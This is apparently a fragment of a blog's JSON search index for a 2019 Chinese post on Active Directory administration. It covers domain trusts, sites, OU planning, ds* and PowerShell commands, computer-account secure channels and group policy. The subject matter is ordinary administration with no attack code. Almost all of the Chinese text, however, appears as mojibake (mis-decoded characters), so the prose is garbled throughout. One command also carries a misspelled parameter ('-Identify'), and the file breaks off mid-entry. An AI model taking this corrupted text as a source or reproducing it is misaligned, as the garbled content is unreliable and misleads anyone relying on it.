ç”¨äºå¤šåŸŸç¯å¢ƒå’Œå…¶å®ƒåŸŸè¿›è¡Œæ•°æ®åŒæ­¥ï¼ˆä½†ä¸æ˜¯åŒæ­¥å…¨éƒ¨æ•°æ®ï¼Œé€šå¸¸éœ€åŒæ­¥çš„æ•°æ®ä»…å  AD æ•°æ®åº“æ€»é‡çš„ 5% ï½ 10%ï¼‰ï¼Œä»¥ä¼˜åŒ– Exchange Server ç­‰åº”ç”¨çš„å…¨å±€æˆ–è·¨åŸŸæœç´¢çš„æ•ˆç‡ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:1:5","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸŸå’Œæ´»åŠ¨ç›®å½•è§„åˆ’ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:2:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å¤šåŸŸç¯å¢ƒçš„éœ€æ±‚ ä¸€ä¸ªåŸŸå¯ä»¥åŒ…å« 100 ä¸‡ä¸ªå¯¹è±¡ï¼Œç»å¤§å¤šæ•°ä¼ä¸šåœ¨æŠ€æœ¯ä¸Šåªéœ€è¦ä¸€ä¸ªåŸŸ å‡ºç°ä»¥ä¸‹éœ€æ±‚æƒ…å†µæ—¶å¯èƒ½éœ€è¦è€ƒè™‘å¤šåŸŸçš„éƒ¨ç½²ï¼š IT ç®¡ç†æ”¿ç­–ä¸Šéœ€è¦æœ‰åˆ†ç¦»æˆ–ç‹¬ç«‹çš„ IT ç®¡æ§è¾¹ç•Œ å…¬å¸é‡ç»„æˆ–åˆå¹¶ç­‰åŸå› å½±å“åˆ°åŸŸçš„å˜åŒ– åŸŸçš„æ”¹é€ å’Œè¿å¾™éœ€è¦åŒæ—¶æ–°æ—§åŸŸçš„å¹¶å­˜ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:2:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å¤šåŸŸçš„åˆ†å¸ƒå¼æ¶æ„ ä¸€ä¸ªåŸŸæ—ä¸­å¯ä»¥åŒ…å«å¤šä¸ªåŸŸï¼Œä¸€ä¸ªåŸŸä¸­å¯ä»¥åŒ…å«å¤šä¸ªå­åŸŸ çˆ¶åŸŸå’Œå­åŸŸçš„å‘½åç©ºé—´(FQDN åŸŸååç¼€)éœ€ä¿æŒç›¸åŒå’Œè¿ç»­ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:2:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸŸå’ŒåŸŸä¹‹é—´çš„ä¿¡ä»»å…³ç³» ä¿¡ä»»å…³ç³»å¯å®ç°è·¨åŸŸçš„èº«ä»½éªŒè¯å’Œèµ„æºè®¿é—® å¦‚æœåŸŸä¹‹é—´æ²¡æœ‰ä¿¡ä»»å…³ç³»ï¼Œæ¯ä¸ªåŸŸä¸­çš„ç”¨æˆ·åªèƒ½è®¿é—®æœ¬åŸŸä¸­çš„èµ„æº æ ¹æ®åœºæ™¯ä¸åŒï¼Œéƒ¨åˆ†ä¿¡ä»»å…³ç³»æ˜¯é»˜è®¤å­˜åœ¨çš„ï¼Œéƒ¨åˆ†æ˜¯éœ€è¦æ‰‹å·¥é…ç½®çš„ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:2:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç«™ç‚¹ ç«™ç‚¹(Site)æ˜¯æŒ‡åŒä¸€ä¸ªåŸŸå†…åŒ…å«ç‰¹å®š IP å­ç½‘å¹¶ä¸ç‰¹å®šåŸŸæ§åˆ¶å™¨å…³è”çš„ç½‘ç»œ éƒ¨ç½²å¤šä¸ªç«™ç‚¹çš„ç›®çš„æ˜¯ä¼˜åŒ–ç«™ç‚¹é—´ DC çš„å¤åˆ¶åŒæ­¥ï¼ŒåŒæ—¶ä½¿å®¢æˆ·ç«¯èƒ½å¤Ÿå’Œå°±è¿‘çš„ DC ä¼˜å…ˆé€šä¿¡ï¼Œä¼˜åŒ–ç™»å½•éªŒè¯çš„æ“ä½œ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:2:4","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ´»åŠ¨ç›®å½•çš„è§„åˆ’ OU å±‚æ¬¡åŒ–ç»“æ„è§„åˆ’ ç”¨æˆ·å’Œè®¡ç®—æœºå‘½åè§„èŒƒ ç»„çš„è§„åˆ’ AD ç®¡ç†æƒé™çš„è§„åˆ’ æ´»åŠ¨ç›®å½•ä¸­çš„å¯¹è±¡ç®¡ç† ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:3:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å›¾å½¢åŒ–ç®¡ç†å·¥å…· ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:4:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å‘½ä»¤è¡Œç®¡ç†å·¥å…· ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:5:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"DS ç³»åˆ—å‘½ä»¤é›† dsqueryã€dsaddã€dsmodã€dsmoveã€dsrmç­‰ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:5:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"PowerShell ç³»åˆ—å‘½ä»¤ Get-ADDomainã€New-Aduserã€Search-ADAccountç­‰ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:5:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ´»åŠ¨ç›®å½•ä¸­çš„å¯¹è±¡ å¯¹è±¡(Object) å¸¸è§çš„å¯¹è±¡åŒ…æ‹¬ï¼šç”¨æˆ·ã€ç»„ã€è®¡ç®—æœºç­‰ å®¹å™¨(Container) ç³»ç»Ÿå†…ç½®ï¼Œæ˜¯éƒ¨åˆ†å¯¹è±¡çš„é»˜è®¤é€»è¾‘å­˜æ”¾ä½ç½® ä¸èƒ½åˆ é™¤æˆ–ç¼–è¾‘ã€æ— æ³•è¿›ä¸€æ­¥å±‚æ¬¡åŒ– ç»„ç»‡å•ä½(OU) ç”¨æˆ·åˆ›å»ºï¼Œç”¨äºè‡ªå®šä¹‰å¯¹è±¡çš„é€»è¾‘å­˜æ”¾ä½ç½® æ”¯æŒå±‚æ¬¡åŒ–ç»“æ„ã€å…è®¸ç¼–è¾‘ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:6:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"OU(ç»„ç»‡å•ä½)è§„åˆ’ ä¸€èˆ¬éœ€ä½“ç°ä¼ä¸šç»„ç»‡æ¶æ„æˆ–åœ°ç†ç‰¹å¾ OU ä¸­çš„å¯¹è±¡ç±»å‹æ˜¯å¦æ··åˆå–å†³ä¸ç®¡ç†çš„éœ€è¦ OU çš„ä¸»è¦ä½œç”¨æ˜¯æ§åˆ¶ç»„ç­–ç•¥éƒ¨ç½²èŒƒå›´å’Œæ´»åŠ¨ç›®å½•çš„ç®¡ç†æƒé™å§”æ´¾ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:7:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å¯¹è±¡ç±»å‹1:ç”¨æˆ· ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:8:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸŸç”¨æˆ·çš„ç™»å½• åŸŸç”¨æˆ·å@åŸŸå ï¼ˆå¦‚tester@abc.comï¼‰ åŸŸå\\åŸŸç”¨æˆ·å ï¼ˆå¦‚abc\\testerï¼‰ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:8:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æŸ¥çœ‹ SID get-aduser -Identify [username] ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:8:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç”¨æˆ·å•ä¸ªç”¨æˆ·çš„åˆ›å»ºå’Œç®¡ç†æ–¹å¼ AD ç”¨æˆ·å’Œè®¡ç®—æœº AD ç®¡ç†ä¸­å¿ƒ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:8:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ‰¹é‡ç”¨æˆ·çš„åˆ›å»ºå’Œç®¡ç†æ–¹å¼ æœåŠ¡å™¨å†…ç½®å‘½ä»¤è¡Œå·¥å…·(å¦‚ csvde å’Œ ldifde) ç¼–å†™ Powershell è„šæœ¬ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:8:4","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å¯¹è±¡ç±»å‹2ï¼šç»„ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:9:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç»„çš„ç”¨é€” æ‰¹é‡è®¾ç½®ç”¨æˆ·çš„æƒé™æˆ–è€…æƒåˆ© ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:9:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç»„çš„åˆ†ç±» æŒ‰æ˜¯å¦å†…ç½®ï¼šå†…ç½®ç»„ã€è‡ªå®šä¹‰ç»„ æŒ‰ä½œç”¨èŒƒå›´ï¼šæœ¬åœ°ç»„ã€å…¨å±€ç»„ã€é€šç”¨ç»„ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:9:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å¯¹è±¡ç±»å‹3ï¼šè®¡ç®—æœº ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:10:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"è®¡ç®—æœºè¢«åŠ¨åŠ åŸŸ æ´»åŠ¨ç›®å½•ä¸­äº‹å…ˆæœªåˆ›å»ºè®¡ç®—æœºè´¦å·ï¼ŒåŠ åŸŸåè®¡ç®—æœºè´¦æˆ·è‡ªåŠ¨ä¿å­˜åœ¨é»˜è®¤çš„ Computers å®¹å™¨ä¸­ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:10:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"è®¡ç®—æœºä¸»åŠ¨åŠ åŸŸ æ´»åŠ¨ç›®å½•ä¸­äº‹å…ˆå·²ç”±ç®¡ç†å‘˜åœ¨æŒ‡å®šçš„ OU ä¸­åˆ›å»ºå¥½è®¡ç®—æœºè´¦å·ï¼ŒåŠ åŸŸåå°†æ ¹æ®å¯¹åº”çš„è®¡ç®—æœºåå…³è”å®ç°åˆ›å»ºåœ¨æŒ‡å®šçš„ OU ä¸­çš„è®¡ç®—æœºè´¦å· ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:10:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"è®¡ç®—æœºè´¦æˆ·å¯†ç /å®‰å…¨é€šé“ åŠ å…¥åŸŸçš„è®¡ç®—æœºä¸åŸŸæ§åˆ¶å™¨ä¹‹é—´é€šè®¯çš„å®‰å…¨é€šé“(Secure Channel)å»ºç«‹éœ€è¦å¯†ç ï¼Œç”±å®¢æˆ·ç«¯è®¡ç®—æœºæœ¬åœ°ç”Ÿæˆåä¸Šä¼ åˆ°åŸŸæ§åˆ¶å™¨çš„æ´»åŠ¨ç›®å½•ä¸­ä¿å­˜ï¼Œé»˜è®¤æ¯éš” 30 å¤©è‡ªåŠ¨æ›´æ¢è¯¥å¯†ç  å¦‚æœå®¢æˆ·ç«¯è®¡ç®—æœºè¶…è¿‡ 30 å¤©æœªèƒ½å’ŒåŸŸæ§åˆ¶å™¨é€šä¿¡ï¼Œåˆ™åŸŸæ§åˆ¶å™¨å…è®¸ä½¿ç”¨ä¹‹å‰ä¿å­˜åœ¨æ´»åŠ¨ç›®å½•ä¸­ä¸Šä¸€æ¬¡å·²è¿‡æœŸçš„è®¡ç®—æœºè´¦æˆ·å¯†ç ç»´ç³»å®‰å…¨é€šé“ï¼Œä½†æ—¶é—´æœ€å¤šä¸èƒ½è¶…è¿‡ä¸¤ä¸ªå¯†ç æ›´æ–°å‘¨æœŸ(é»˜è®¤æœ€é•¿60å¤©)ï¼Œå¦åˆ™å®‰å…¨é€šé“å°†è¢«ç ´åï¼Œå®¢æˆ·ç«¯å°†è‡ªåŠ¨è„±åŸŸï¼Œå¯¼è‡´ç”¨æˆ·æ— æ³•ç™»å½• è®¡ç®—æœºå¯†ç çš„æ›´æ–°å‘¨æœŸå’Œæœ‰æ•ˆæ€§ç­‰å‚æ•°å¯é€šè¿‡ç»„ç­–ç•¥è°ƒæ•´ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:11:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å¯¹è±¡çš„æŸ¥æ‰¾å’Œç­›é€‰ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:12:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"AD ç”¨æˆ·å’Œè®¡ç®—æœº ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:12:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"AD ç®¡ç†ä¸­å¿ƒ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:12:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"PS è„šæœ¬ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:12:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"AD ç®¡ç†çš„æƒåˆ©å§”æ´¾ å¯¹ AD çš„æ“ä½œå§”æ´¾å¯ä»¥åœ¨ OU å±‚é¢é…ç½®,ä»¥åˆ†é…å¯¹è¯¥ OU å†…å¯¹è±¡çš„å¸¸è§ç®¡ç†ä»»åŠ¡ç»™æŒ‡å®šçš„ç”¨æˆ·æˆ–ç»„ï¼Œå‡è½»åŸŸç®¡ç†å‘˜å·¥ä½œè´Ÿè·(æ¯”å¦‚ä¿®æ”¹éƒ¨é—¨è´¦çš„å±æ€§,è§£é™¤å¸å·é”å®š,é‡ç½®è´¦æˆ·å¯†ç ç­‰) ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:13:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"RSAT å·¥å…· RAT(Remote Server Administration Tool)å¯é…åˆ AD æƒåˆ©å§”æ´¾ï¼Œç”¨äºåœ¨å®¢æˆ·ç«¯æ“ä½œç³»ç»Ÿä¸Šè¿›è¡ŒADåŸŸæœåŠ¡çš„è¿œç¨‹æ“ä½œ(å¦‚é‡ç½®å¯†ç ï¼Œè§£ç¦å¯†ç ç­‰) ç»„ç­–ç•¥çš„é…ç½® ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:13:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç»„ç­–ç•¥æ¦‚è¿° ç»„ç­–ç•¥çš„æœ¬è´¨æ˜¯ä»¥æ›´å‹å¥½çš„æ–¹å¼ä¿®æ”¹è®¡ç®—æœºçš„æ³¨å†Œè¡¨ï¼Œç»„ç­–ç•¥ä¸­æ¯ä¸€é¡¹è®¾ç½®éƒ½å¯ä»¥å’Œæ³¨å†Œè¡¨ä¸­çš„é”®å€¼å¯¹åº”ï¼Œä»¥å®ç°å¯¹æ“ä½œç³»ç»ŸåŠåº”ç”¨ç¨‹åºçš„è¿è¡Œæ§åˆ¶ ç»„ç­–ç•¥åŒ…å«æœ¬åœ°ç»„ç­–ç•¥å’ŒåŸŸç»„ç­–ç•¥ æœ¬åœ°ç»„ç­–ç•¥: gpedit.msc åŸŸç»„ç­–ç•¥ï¼šåŸŸæ§åˆ¶å™¨ä¸Šä½¿ç”¨ ç»„ç­–ç•¥å·¥å…· é…ç½®å¹¶ä¸‹å‘ é€šè¿‡åŸŸç»„ç­–ç•¥æœ‰åŠ©äºè§„èŒƒåŸŸå†…ç»ˆç«¯çš„ç»Ÿä¸€ç®¡ç†å¹¶å‡å°‘äººå‘˜çš„å·¥ä½œé‡ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:14:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç»„ç­–ç•¥çš„å¸¸è§ç”¨é€” å¸å·å®‰å…¨/å®¡è®¡ç­–ç•¥ å¼€æœº/å…³æœºè„šæœ¬ æ–‡ä»¶å¤¹é‡å®šå‘ éƒ¨ç½²æ‰“å°æœº/å…±äº«æ–‡ä»¶å¤¹æ˜ å°„ å®¢æˆ·ç«¯æ¡Œé¢ç¯å¢ƒè®¾ç½® IE ç­‰å¾®è½¯åº”ç”¨ç¨‹åºå‚æ•°è®¾ç½® è½¯ä»¶è‡ªåŠ¨å®‰è£…éƒ¨ç½² é™åˆ¶è½¯ä»¶è¿è¡Œ é˜²ç«å¢™å®‰å…¨è®¾ç½® ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:15:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç»„ç­–ç•¥çš„åˆ†ç±» ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:16:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç»´åº¦ä¸€ï¼šæŒ‰é…ç½®ç”Ÿæ•ˆçš„é˜¶æ®µ è®¡ç®—æœºé…ç½® ç”¨æˆ·é…ç½® ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:16:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD 